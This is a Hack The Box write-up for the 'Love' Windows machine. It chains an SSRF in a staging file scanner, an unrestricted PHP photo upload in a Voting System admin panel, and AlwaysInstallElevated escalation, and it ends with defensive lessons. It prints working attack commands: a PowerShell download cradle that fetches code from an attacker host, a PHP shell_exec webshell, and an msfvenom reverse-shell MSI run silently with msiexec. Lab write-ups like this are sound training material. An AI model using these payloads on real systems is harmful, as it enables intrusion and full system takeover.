---
title: 'Love'
target: 'Hack The Box — Love'
difficulty: 'easy'
date: 2025-12-30
summary: 'An HTB machine — SSRF in a staging subdomain file scanner leaks admin credentials from an internal service, unrestricted PHP upload in a Voting System admin portal provides a shell as Phoebe, and AlwaysInstallElevated policy enables MSI-based escalation to SYSTEM.'
role: 'pentest'
tags: ['nmap', 'ssl-certificate', 'subdomain', 'ssrf', 'server-side-request-forgery', 'voting-system', 'php', 'file-upload', 'webshell', 'powershell', 'cobalt-strike', 'alwaysinstallelevated', 'msi', 'msfvenom', 'msiexec', 'privilege-escalation', 'windows']
problem: 'Windows 10 machine with HTTP on ports 80, 443, and 5000. The SSL certificate leaks staging.love.htb which hosts a file scanner vulnerable to SSRF, port 5000 is internally restricted but reachable via SSRF exposing Voting System admin credentials, the admin portal has unrestricted file upload, and AlwaysInstallElevated is enabled.'
action: 'Nmap identified seven ports including HTTP on 80/443/5000 with Apache 2.4.46 and PHP 7.3.27. SSL certificate on 443 leaked staging.love.htb; the staging site hosted a file scanner at /beta.php vulnerable to SSRF. Submitted localhost:5000 through the scanner to access the internal Password Dashboard, recovering Voting System admin credentials. Logged into /admin, uploaded a PHP reverse shell via the profile photo feature, and got a callback as Phoebe. SharpUp found AlwaysInstallElevated enabled; generated an MSI payload with msfvenom, executed it with msiexec, and received a SYSTEM shell.'
outcome: 'SYSTEM-level access via three chained vulnerabilities. SSRF leaked internal credentials, unrestricted file upload gave code execution as Phoebe, and AlwaysInstallElevated enabled MSI-based privilege escalation to SYSTEM.'
draft: false
---

## Background

Love is an easy-rated Windows machine that chains three distinct vulnerability classes — SSRF for credential disclosure, unrestricted file upload for initial access, and a Windows Installer policy misconfiguration for privilege escalation. The interesting aspect is how the SSRF ties everything together: port 5000 is blocked externally, but the staging subdomain's file scanner will happily make requests to localhost on the attacker's behalf, exposing credentials that unlock the admin portal on a completely different application. From there, the Voting System's lack of file upload validation provides code execution, and a misconfigured Windows Installer policy grants SYSTEM without any exploit code.

---

## Enumeration

Running an **nmap** scan with service version detection:

```
nmap -vv --reason --top-ports 1000 -sV -Pn 10.10.10.239
```

```
PORT     STATE SERVICE      REASON  VERSION
80/tcp   open  http         syn-ack Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
135/tcp  open  msrpc        syn-ack Microsoft Windows RPC
139/tcp  open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn
443/tcp  open  ssl/http     syn-ack Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
445/tcp  open  microsoft-ds syn-ack Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3306/tcp open  mysql?       syn-ack
5000/tcp open  http         syn-ack Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
```

Seven ports open on a Windows machine running **Apache 2.4.46** with **PHP 7.3.27** across three different web service ports — **80**, **443**, and **5000**. The standard Windows services are present with SMB on 445, and MySQL on 3306 suggests a database-backed web application. Port 5000 running the same Apache stack as 80 and 443 is unusual — a separate web service on a non-standard port is worth investigating.

When web services have HTTPS enabled, certificate information can be a valuable source of reconnaissance data. The SSL certificate on port 443 reveals a subdomain:

![Nmap ssl-cert script output showing Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=norway/organizationalUnitName=love.htb. Issuer: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=norway/organizationalUnitName=love.htb. Self-signed certificate with the staging subdomain visible in both Subject and Issuer fields.](/writeups/htb-love/01-ssl-cert.png)

The certificate's Subject and Issuer fields both contain **commonName=staging.love.htb** with **organizationName=ValentineCorp** and **organizationalUnitName=love.htb**. A staging subdomain — potentially running a different application or an earlier version with weaker security controls. Adding `staging.love.htb` to `/etc/hosts` opens up the next attack surface.

---

## SSRF — the file scanner

Browsing to `staging.love.htb` reveals a **Free File Scanner** application by Valentine Corporation. The Demo page at `/beta.php` provides a simple form where any user can submit a URL for the service to scan:

![Browser at staging.love.htb/beta.php showing the Free File Scanner application. Navigation bar with Home and Demo links. Center form titled "Specify the file url:" with an input field placeholder "File to scan", helper text "Enter the url of the file to scan", and a large green "Scan file" button. Footer reads "Valentine Corpotation. All Rights Reserved."](/writeups/htb-love/02-file-scanner.png)

The form accepts a URL and the server makes the request itself — a classic setup for Server-Side Request Forgery. The key question is whether the server sanitizes the input to prevent requests to internal resources. Testing with `localhost`-based URLs confirms it doesn't — the server will fetch any URL without restriction.

Port 5000 returned a 403 Forbidden error when accessed directly from the attacker machine, but through the SSRF it becomes reachable. Submitting `localhost:5000` in the file scanner input reveals what the restricted service is hiding:

![Browser at staging.love.htb/beta.php showing the SSRF result. The input field contains "localhost:5000" highlighted with a green border. Below the Scan file button, the response renders inline — a yellow banner reading "Password Dashboard" with Home and Demo navigation links, and below it a light blue panel titled "Voting system Administration" with a close button, containing the text "Vote Admin Creds admin" followed by a partially redacted password.](/writeups/htb-love/03-ssrf-creds.png)

The internal service on port 5000 is a **Password Dashboard** — and it's displaying the **Voting System Administration** credentials in plaintext, including the admin username and password. The SSRF turned a 403 into full credential disclosure by making the request from the server's own localhost context, bypassing whatever access control was blocking external requests.

---

## Voting System — admin access

The main site on port 80 runs a **Voting System** with a login page. There are actually two different login interfaces — the base URL at `10.10.10.239` shows a voter login with a "Voter's ID" field, while `/admin` presents an admin login with a standard "Username" field:

![Side-by-side browser comparison showing two Voting System login pages. Left: URL 10.10.10.239/admin with "Sign in to start your session" text, Username field highlighted with green border, Password field, and blue Sign In button. Right: URL 10.10.10.239 with identical layout but the first field reads "Voter's ID" instead of Username, also highlighted with green border. Both pages share the same "Voting System" heading and styling.](/writeups/htb-love/04-login-portals.png)

The admin portal at `/admin` is the target — it accepts the credentials recovered through the SSRF. After logging in and exploring the admin dashboard, the file upload vector becomes apparent. The Admin Profile update modal includes a **Photo** upload field that accepts any file type without validation:

![Admin Profile modal dialog in the Voting System admin panel. Fields shown — Username: admin, Password field filled with dots (masked), Firstname: Neovic, Lastname: Devierte. Photo field shows a Browse button with "test.php" as the selected filename. Current Password field filled with dots. Close button (X) at top right and green Save button at bottom right. Behind the modal, partial view of the admin dashboard with green "Success" and "file update" notifications visible.](/writeups/htb-love/05-php-upload.png)

The PHP payload uploaded through the Photo field is a simple `shell_exec()` wrapper around an encoded PowerShell download cradle. The encoding step avoids issues with nested quotation marks in the PHP-to-PowerShell chain:

```
echo "IEX ((new-object net.webclient).downloadstring('http://<attacker-ip>:80/a'))" | iconv -t UTF-16LE | base64 -w 0
```

The resulting base64 string goes into the PHP file:

```php
<?php shell_exec("powershell -nop -w hidden -enc <BASE64>"); ?>
```

After uploading `test.php` and saving the profile changes, the PHP file executes on the server, triggering the PowerShell download cradle. The callback lands as the low-privilege user **Phoebe**, and the user flag was retrieved from her desktop.

---

## Privilege escalation — AlwaysInstallElevated

With a shell as Phoebe, local enumeration with **SharpUp** reveals the privilege escalation path — the **AlwaysInstallElevated** registry key is set to **True**. This Windows policy, when enabled in both the HKLM and HKCU registry hives, allows any user to install MSI packages with SYSTEM-level privileges. Microsoft strongly discourages this configuration, but it still appears in environments where administrators want to simplify software deployment.

Generating a malicious MSI payload with **msfvenom**:

```
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker-ip> LPORT=9458 -f msi -o love2.msi
```

After uploading the MSI to the target, executing it silently with `msiexec`:

```
msiexec /quiet /qn /i C:\Users\Public\love2.msi
```

The reverse shell connects back:

![Terminal showing nc -nvlp 9458 listener at ~/tools/htb/love. Connection received from 10.10.10.239 port 52700. Microsoft Windows Version 10.0.19042.928, copyright Microsoft Corporation. Command prompt at C:\WINDOWS\system32 with whoami returning "nt authority\system".](/writeups/htb-love/06-system-shell.png)

**NT AUTHORITY\SYSTEM** — the MSI package installs with elevated privileges thanks to the AlwaysInstallElevated policy, and the embedded reverse shell payload executes in the SYSTEM context. The root flag was retrieved.

---

## What I took from this

Love demonstrates how SSRF can turn internal services into information leaks. The Password Dashboard on port 5000 was properly firewalled from external access — returning 403 to direct requests — but the file scanner on the staging subdomain defeated that control entirely. The scanner's purpose was to fetch and analyze remote files, so making HTTP requests was its intended behavior. The vulnerability wasn't that it made requests; it was that it made requests to any destination including localhost without restriction. The fix is straightforward: block requests to RFC 1918 addresses, loopback addresses, and link-local ranges in any server-side URL fetching functionality. But SSRF is easy to overlook because the feature is working exactly as designed from the developer's perspective — the server is supposed to fetch URLs.

The certificate disclosure of the staging subdomain is a reconnaissance technique worth remembering. SSL certificates are public by design — they're sent in cleartext during the TLS handshake, and Certificate Transparency logs make them searchable even without connecting to the server. Organizations often use certificates that reference internal hostnames, staging environments, or other infrastructure that wasn't intended to be discoverable. Tools like `crt.sh` and nmap's `ssl-cert` script make this enumeration trivial, and the information frequently reveals attack surface that wouldn't appear in standard subdomain brute-forcing.

The AlwaysInstallElevated escalation is one of the cleanest Windows privilege escalation paths — it's a single registry check followed by a single msfvenom command. The policy exists to allow standard users to install software without admin credentials, but MSI packages can contain custom actions that execute arbitrary commands during installation. When the installation runs with SYSTEM privileges, those commands inherit that context. The policy effectively turns every user on the system into a local administrator, which is why it appears in every Windows privilege escalation checklist. The defense is simple: don't enable it. If software deployment needs to bypass UAC, use Group Policy Software Installation or SCCM rather than granting universal elevation to the installer service.
